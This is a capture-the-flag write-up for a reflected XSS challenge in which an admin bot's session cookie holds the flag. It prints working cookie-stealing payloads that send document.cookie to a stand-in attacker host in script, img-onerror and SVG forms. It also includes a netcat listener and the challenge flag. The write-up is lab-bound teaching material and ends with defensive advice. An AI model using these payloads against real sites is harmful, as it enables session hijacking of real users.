---
title: "XSS - Cookie Stealer"
description: "Exploiting a reflected XSS vulnerability to steal an admin bot's session cookie containing the flag."
author: "Zemi"
---

## Challenge Info

| Detail     | Value              |
|------------|--------------------|
| Category   | Web Exploitation   |
| Difficulty | Medium             |
| Points     | 250                |
| Flag       | `zemi{r3fl3ct3d_p41n}` |

## Challenge Files

Download the challenge files to get started:

- [app.py](/Website/challenges/xss-cookie-stealer/app.py)
- [flag.txt](/Website/challenges/xss-cookie-stealer/flag.txt)
- [README.md](/Website/challenges/xss-cookie-stealer/README.md)
- [requirements.txt](/Website/challenges/xss-cookie-stealer/requirements.txt)

## Reconnaissance

The challenge gives us a simple search page at `http://challenge.ctf.local:9090/search`. There's also a "Report URL to Admin" feature — a classic indicator that we need to exploit XSS against a bot.

Searching for `test` returns:

```html
<p>Results for: test</p>
```

Our input is reflected directly in the page. Let's test for XSS:

```
<script>alert(1)</script>
```

The page renders:

```html
<p>Results for: <script>alert(1)</script></p>
```

The alert fires. We have reflected XSS with zero filtering.

## Analysis

The attack plan:

1. Craft a URL with an XSS payload that exfiltrates cookies
2. Submit that URL to the admin bot via the "Report URL" feature
3. The bot visits our URL, executes our script, and sends us its cookies
4. The flag is stored in the bot's cookie

We need a way to receive the exfiltrated data. We can use a webhook service or set up a simple listener:

```bash
# Start a listener on our machine
nc -lvnp 4444
```

Or use a free webhook service like `https://webhook.site` to catch the request.

## Exploitation

Craft the payload URL:

```
http://challenge.ctf.local:9090/search?q=<script>fetch('https://ATTACKER_SERVER/steal?c='+document.cookie)</script>
```

URL-encoded version:

```
http://challenge.ctf.local:9090/search?q=%3Cscript%3Efetch(%27https%3A%2F%2FATTACKER_SERVER%2Fsteal%3Fc%3D%27%2Bdocument.cookie)%3C%2Fscript%3E
```

Submit this URL to the admin bot. Within seconds, our listener catches:

```
GET /steal?c=session=zemi{r3fl3ct3d_p41n} HTTP/1.1
Host: ATTACKER_SERVER
```

The flag is `zemi{r3fl3ct3d_p41n}`.

## Alternative Payloads

If `<script>` tags are blocked, try event handlers:

```html
<img src=x onerror="fetch('https://ATTACKER_SERVER/?c='+document.cookie)">
```

Or use SVG:

```html
<svg onload="fetch('https://ATTACKER_SERVER/?c='+document.cookie)">
```

## Tools Used

- Browser DevTools
- Netcat / webhook.site (to receive exfiltrated data)
- URL encoder

## Lessons Learned

- **Always** encode/escape user input before reflecting it in HTML
- Use Content Security Policy (CSP) headers to restrict script execution
- Set the `HttpOnly` flag on sensitive cookies to prevent JavaScript access
- The `SameSite` cookie attribute can limit cross-site request forgery
- Input validation alone is not sufficient — output encoding is critical
